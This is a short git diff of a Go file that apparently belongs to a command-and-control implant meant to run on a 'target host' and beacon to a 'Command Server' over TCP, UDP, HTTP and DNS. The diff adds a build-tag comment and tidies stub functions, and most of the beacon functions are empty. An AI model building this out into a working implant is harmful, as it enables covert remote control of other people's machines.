@@ -1,6 +1,17 @@
 /*/
 This is the file that will be compiled into the binary
 	that gets placed on the target host
+
+We are using the feature outlined in :
+	- https://golang.org/cmd/go/#hdr-Build_constraints
+
+	Placing the tag "+build some_tag_here"
+		as a comment "//"
+		at the top of the file
+		and using "go build -tags some_tag_here"
+
+	will compile main.go with code from that file mixed in
+
 /*/
 package target_binary
 
@@ -55,7 +66,6 @@ func BaconTCP(zombie_ID string) {
 
 // Same for UDP
 func BeaconUDP() {
-
 }
 
 // we are going to make different HTTP requests to the Command Server in an ettempt to
@@ -64,10 +74,8 @@ func BeaconHTTP() {
 
 }
 
-func BeaconDNS(name ) {
-	MDNS_BEACON := shared_code.FakeMDNSService{
-		info = 
-	}
+func BeaconDNS(name) {
+	MDNS_BEACON := shared_code.FakeMDNSService{}
 	shared_code.StartMdnsReceiver(MDNS_BEACON)
 }
 
